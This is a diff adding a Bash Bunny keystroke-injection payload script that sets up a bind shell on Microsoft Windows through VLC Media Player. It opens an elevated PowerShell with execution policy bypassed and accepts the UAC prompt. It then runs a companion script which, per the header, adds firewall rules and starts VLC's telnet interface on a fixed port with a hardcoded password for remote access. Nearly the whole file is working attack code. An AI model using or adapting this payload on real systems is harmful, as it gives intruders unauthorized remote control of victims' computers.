@@ -1,0 +1,89 @@
+#!/bin/bash
+#
+# Title:            "VideoLan VLC Media Player" Bind Shell
+#
+# Description:
+#                   1) Hide "PowerShell" window.
+#                   2) Determines the path of the "VLC Media Player" executable.
+#                   3) Creates two rules on the native firewall of "Microsoft Windows" to :
+#                    - Allow the executable to open a TCP port.
+#                    - Allow all incoming connections on that TCP port.
+#                   4) Starts the "VLC Media Player" executable with the "Telnet" interface enabled.
+#                   5) Redirects the standard error output of this process and retrieves the payload for execution.
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Remote Access
+# Target:           Microsoft Windows
+# Attackmodes:      HID STORAGE
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10 and VideoLan VLC Media Player 3.0.18
+#
+# NOTE
+# ===============
+# The target user must belong to the 'Administrator' group.
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## INITIALIZATION ########
+
+readonly TELNET_PORT="44423"
+readonly TELNET_PASSWORD="VLC_T3LN3T"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET BB_LABEL
+GET SWITCH_POSITION
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q GUI r
+Q DELAY 3000
+Q STRING "powershell -NoLogo -NoProfile -ExecutionPolicy Bypass"
+Q DELAY 1500
+Q CTRL-SHIFT ENTER
+Q DELAY 3000
+Q LEFTARROW
+Q DELAY 3000
+Q ENTER
+Q DELAY 3000
+
+LED STAGE2
+
+Q STRING "\$BB_VOLUME = \"\$((Get-WmiObject -Class Win32_Volume -Filter \"Label LIKE '${BB_LABEL}'\").Name)payloads\\${SWITCH_POSITION}\\\""
+Q ENTER
+Q DELAY 2000
+
+Q STRING "CD \"\${BB_VOLUME}\""
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+Q STRING ".\payload.ps1 -TELNET_PORT \"${TELNET_PORT}\" -TELNET_PASSWORD \"${TELNET_PASSWORD}\""
+Q ENTER
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+
+######## FINISH ########
+
+LED FINISH
